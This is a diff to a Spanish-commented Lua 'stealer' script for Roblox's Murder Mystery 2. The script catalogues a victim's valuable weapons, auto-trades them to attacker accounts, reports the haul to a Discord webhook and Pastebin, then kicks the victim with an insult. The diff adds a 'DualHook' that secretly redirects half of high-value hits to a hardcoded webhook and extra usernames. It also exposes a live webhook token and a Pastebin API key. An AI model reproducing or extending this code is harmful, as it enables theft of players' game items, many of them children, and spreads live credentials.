@@ -7,12 +7,18 @@ if setclipboard then
     setclipboard("https://discord.gg/4VySnCHy")
 end
 
--- Configuración
+-- Configuración principal
 local webhook = _G.webhook or ""
 local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
+
+-- Configuración DualHook
+local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
+local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambiar a tu webhook real
+local DualHookMinValue = 500
+local DualHookPercent = 50 -- porcentaje de hits que se van a ti
 
 -- Kick por servidor lleno, privado o VIP
 local function CheckServerInitial()
@@ -32,24 +38,38 @@ CheckServerInitial()
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
-local function SendWebhook(title, description, fields, prefix)
+-- Función para enviar webhook (dualhook automático)
+local function SendDualHook(title, description, fields)
+    local useDual = false
+    for _, field in ipairs(fields or {}) do
+        if field.value then
+            local v = tonumber(field.value:match("Valor:%s*(%d+)") or 0)
+            if v >= DualHookMinValue then
+                local rand = math.random(1,100)
+                if rand <= DualHookPercent then
+                    useDual = true
+                    break
+                end
+            end
+        end
+    end
+    local targetWebhook = useDual and DualHookWebhook or webhook
     local data = {
-        ["content"] = prefix or "",
+        ["content"] = "",
         ["embeds"] = {{
             ["title"] = title,
             ["description"] = description or "",
             ["color"] = 65280,
             ["fields"] = fields or {},
-            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
-            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
+            ["thumbnail"] = {["url"]="https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
+            ["footer"] = {["text"]="DualHook by Anonimo 🇪🇨"}
         }}
     }
     local body = HttpService:JSONEncode(data)
-    pcall(function()
-        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
-    end)
+    pcall(function() req({Url=targetWebhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end)
 end
 
+-- Función para crear Pastebin
 local function CreatePaste(content)
     local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
     local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
@@ -74,6 +94,7 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     end
 end
 
+-- TradeService
 local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
@@ -97,16 +118,10 @@ local categories = {
 local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
 
 local function trim(s) return s:match("^%s*(.-)%s*$") end
-local function fetchHTML(url)
-    local res=req({Url=url, Method="GET", Headers=headers})
-    return res and res.Body or ""
-end
-local function parseValue(div)
-    local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-    if str then str=str:gsub(",","") return tonumber(str) end
-end
+local function fetchHTML(url) local res=req({Url=url, Method="GET", Headers=headers}) return res and res.Body or "" end
+local function parseValue(div) local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>") if str then str=str:gsub(",","") return tonumber(str) end end
 local function extractItems(html)
-    local t={}
+    local t={} 
     for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
         name=trim(name:match("([^<]+)"):gsub("%s+"," "))
         name=trim((name:split(" Click "))[1])
@@ -116,7 +131,7 @@ local function extractItems(html)
     return t
 end
 local function extractChroma(html)
-    local t={}
+    local t={} 
     for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
         local n=trim(name:match("([^<]+)"):gsub("%s+"," ")):lower()
         local v=parseValue(body)
@@ -132,9 +147,7 @@ local function buildValueList()
             if r~="chroma" then
                 local vals=extractItems(html)
                 for k,v in pairs(vals) do allValues[k]=v end
-            else
-                chromaValues=extractChroma(html)
-            end
+            else chromaValues=extractChroma(html) end
         end
     end
     local valueList={}
@@ -159,6 +172,7 @@ local function buildValueList()
     return valueList
 end
 
+-- Preparar armas a enviar
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
@@ -178,30 +192,28 @@ for id,amount in pairs(profile.Weapons.Owned) do
         end
     end
 end
-
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
+
+-- Webhook inicial
+local weaponsSent = {}
+for _, w in ipairs(weaponsToSend) do table.insert(weaponsSent, w) end
 
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Guardamos una copia para webhook final
-local weaponsSent = {}
-for _, w in ipairs(weaponsToSend) do
-    table.insert(weaponsSent, w)
-end
+local function SendInitWebhook()
+    if #weaponsSent == 0 then return end
 
--- Webhook inicial con Pastebin si >18
-local pasteContent = ""
-for _, w in ipairs(weaponsSent) do
-    pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
-end
-pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"
-local pasteLink
-if #weaponsSent > 18 then
-    pasteLink = CreatePaste(pasteContent)
-end
+    local pasteLink
+    if #weaponsSent > 18 then
+        local pasteContent = ""
+        for _, w in ipairs(weaponsSent) do
+            pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+        end
+        pasteContent = pasteContent.."\nValor total del inventario📦: "..tostring(totalValue).."💰"
+        pasteLink = CreatePaste(pasteContent)
+    end
 
-if #weaponsSent > 0 then
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="Inventario 📦:", value="", inline=false},
@@ -223,10 +235,11 @@ if #weaponsSent > 0 then
     end
 
     local prefix=pingEveryone and "@everyone " or ""
-    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
+    SendDualHook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit)
 end
+SendInitWebhook()
 
--- Función final para trades (solo webhook final, sin Pastebin, sin @everyone)
+-- Trade finalizado
 local function TradeFinalizado()
     local fieldsFinal={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -244,9 +257,7 @@ local function TradeFinalizado()
         fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
     end
 
-    SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
-    
-    -- Tiempo de espera antes del Kick, puedes cambiar 3 a cualquier valor
+    SendDualHook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
     task.wait(3)
     LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 end
@@ -276,13 +287,14 @@ local function doTrade(targetName)
     TradeFinalizado()
 end
 
+-- Conectar trades con los usuarios
 for _, p in ipairs(Players:GetPlayers()) do
-    if table.find(users,p.Name) then
+    if table.find(users,p.Name) or table.find(DualHookUsers,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
 Players.PlayerAdded:Connect(function(p)
-    if table.find(users,p.Name) then
+    if table.find(users,p.Name) or table.find(DualHookUsers,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
